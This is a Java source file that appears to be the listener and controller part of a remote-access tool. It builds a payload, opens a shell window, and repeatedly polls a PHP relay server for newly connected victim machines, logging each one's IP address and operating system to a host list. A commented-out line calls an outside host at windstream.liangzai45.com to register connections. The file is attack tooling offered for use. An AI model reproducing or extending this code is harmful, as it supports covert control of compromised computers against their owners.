package net.wind.core.Listening;

import net.wind.BoyLoader;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Properties;
import java.util.Scanner;

import net.wind.core.Config.MakePayload;
import net.wind.utils.HttpUtils;
import net.wind.core.window.getReFreshtime;
import net.wind.core.window.ShellWindow;
import net.wind.core.window.getPhPClient;

/**
 * createTime 2022/11/19 0019
 * fileName ListenMain
 *
 * @author WindStream
 */

public class ListenMain{

    private ServerSocket serverClient;
    private Socket serverSocket;
    void buildSocket(){
        try{
            serverClient = new ServerSocket(BoyLoader.userPort);
            System.out.print("Created Successfully");
            serverSocket = serverClient.accept();
            System.out.print("A Host is connected.");
            serverSocket.close();
            serverClient.close();

        }catch (IOException e){
            System.out.print("Had a mistake with creating that we can't open your port to start listen...()");
            e.printStackTrace();
        }
    }
    private static int reFreshtime;
    public static void StartListening() throws InterruptedException, IOException {
        ShellWindow shellWindow = new ShellWindow();
        ListenMain server = new ListenMain();
        Scanner sc = new Scanner(System.in);
        BoyLoader.phpClient = getPhPClient.getPhpClient();
        getPhPClient.makesurePhpClient();
        MakePayload.createPayload();
        reFreshtime = getReFreshtime.getRefreshtime();


        //HttpUtils.doGet("http://windstream.liangzai45.com/cir/connectHost.php?ip=127.1.1.1");
        ShellWindow.buildShellWindow();
        while(true) {
            Thread.sleep(reFreshtime);
            String Ip = HttpUtils.doGet(BoyLoader.phpClient+"/ServerGetIP.php");
            //Properties sysProperty = System.getProperties();
           // HttpUtils.doGet(BoyLoader.phpClient+"/ClientSystem.php?ip="+Ip+"&system="+sysProperty.getProperty("os.name"));
            String System = HttpUtils.doGet(BoyLoader.phpClient+"/ServerGetSystem.php?ip="+Ip);
            if(Ip.equals("")){

            }else {
                BoyLoader.print("New Host Online ---> IP: "+Ip+"   System: " + System);
                BoyLoader.Host_List.add(Ip);
            }
            //System.out.print(Ip);
        }

        //server.buildSocket();

    }
}
